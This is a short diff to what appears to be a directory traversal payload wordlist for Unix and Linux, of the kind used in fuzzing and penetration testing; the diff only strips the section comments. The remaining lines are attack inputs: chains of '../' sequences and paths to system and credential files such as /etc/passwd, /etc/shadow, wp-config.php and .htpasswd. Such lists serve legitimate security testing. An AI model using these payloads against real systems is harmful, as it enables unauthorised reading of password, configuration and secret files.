@@ -1,8 +1,3 @@
-# ============================================================
-# Directory Traversal — Unix / Linux
-# ============================================================
-
-# ---- Basic ----
 ../
 ../../
 ../../../
@@ -12,7 +7,6 @@
 ../../../../../../../
 ../../../../../../../../
 
-# ---- Absolute Paths ----
 /etc/passwd
 /etc/shadow
 /etc/hosts
@@ -37,7 +31,6 @@
 /var/www/html/wp-config.php
 /var/www/html/.htpasswd
 
-# ---- Common Relative Traversal Paths ----
 ../etc/passwd
 ../../etc/passwd
 ../../../etc/passwd
@@ -47,6 +40,5 @@
 ../../../../../../../etc/passwd
 ../../../../../../../../etc/passwd
 
-# ---- From Web Root ----
 ./etc/passwd
 ././etc/passwd
